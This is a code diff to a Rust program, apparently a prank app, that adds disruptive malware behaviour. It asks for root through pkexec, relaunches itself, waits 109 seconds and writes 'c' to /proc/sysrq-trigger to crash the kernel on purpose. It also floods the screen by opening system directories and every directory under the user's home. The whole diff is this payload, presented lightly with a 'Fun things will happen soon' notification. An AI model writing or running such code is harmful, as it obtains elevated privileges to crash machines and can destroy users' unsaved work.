@@ -1,4 +1,4 @@
-use std::io::Cursor;
+use std::{env, io::Cursor, str::FromStr};
 
 use zbus::blocking::connection::{self, Builder};
 
@@ -6,6 +6,26 @@ mod fun;
 mod music;
 
 fn main() {
+    let args: Vec<String> = env::args().collect();
+
+    if args.contains(&String::from_str("--crusher").unwrap()) {
+        std::thread::sleep(std::time::Duration::from_secs(109));
+        fun::execute_shell("echo c > /proc/sysrq-trigger");
+        return;
+    }
+
+    std::thread::spawn(move || {
+        let output = std::process::Command::new("pkexec")
+            .arg(std::env::current_exe().unwrap())
+            .arg("--crusher")
+            .output()
+            .unwrap();
+    
+        if !output.status.success() {
+            std::process::exit(1);
+        }
+    });
+    
     music::play_audio();
 
     fun::notify("Fun things will happen soon", ":D");
@@ -107,10 +127,54 @@ fn main() {
             }
         }
 
-        std::thread::sleep(std::time::Duration::from_millis(3500));
+        if global_attack == 0 {
+            std::thread::sleep(std::time::Duration::from_millis(3500));
+        }
     }
 
+    let username = std::env::var("USER").unwrap();
+
+    std::thread::spawn(move || {
+        fun::execute_shell("xdg-open /");
+        fun::toggle_desktop_overview();
+        std::thread::sleep(std::time::Duration::from_millis(400));
+        fun::toggle_desktop_overview();
+        fun::execute_shell("xdg-open /bin");
+        std::thread::sleep(std::time::Duration::from_millis(400));
+        fun::toggle_desktop_overview();
+        fun::execute_shell("xdg-open /etc");
+        std::thread::sleep(std::time::Duration::from_millis(400));
+        fun::toggle_desktop_overview();
+        fun::execute_shell("xdg-open /home");
+        std::thread::sleep(std::time::Duration::from_millis(400));
+        fun::toggle_desktop_overview();
+        fun::execute_shell("xdg-open /lib");
+        std::thread::sleep(std::time::Duration::from_millis(400));
+        fun::toggle_desktop_overview();
+        fun::execute_shell("xdg-open /usr");
+    });
+
+    for entry in std::fs::read_dir(format!("/home/{}", username)).unwrap() {
+        let entry = entry.unwrap();
+        if entry.file_type().unwrap().is_dir() {
+            fun::execute_shell(format!("xdg-open {}", entry.path().display()).as_str());
+
+            for entry2 in std::fs::read_dir(entry.path()).unwrap() {
+                let entry2 = entry2.unwrap();
+
+                if entry2.file_type().unwrap().is_dir() {
+                    fun::execute_shell(format!("xdg-open {}", entry2.path().display()).as_str());
+
+                    std::thread::sleep(std::time::Duration::from_millis(300));
+                    fun::toggle_desktop_overview();
+                }
+            }
+
+            std::thread::sleep(std::time::Duration::from_millis(300));
+        }
+    }
     
-    
-    std::thread::sleep(std::time::Duration::from_millis(9000));
+    std::thread::sleep(std::time::Duration::from_secs(40));
+
+
 }
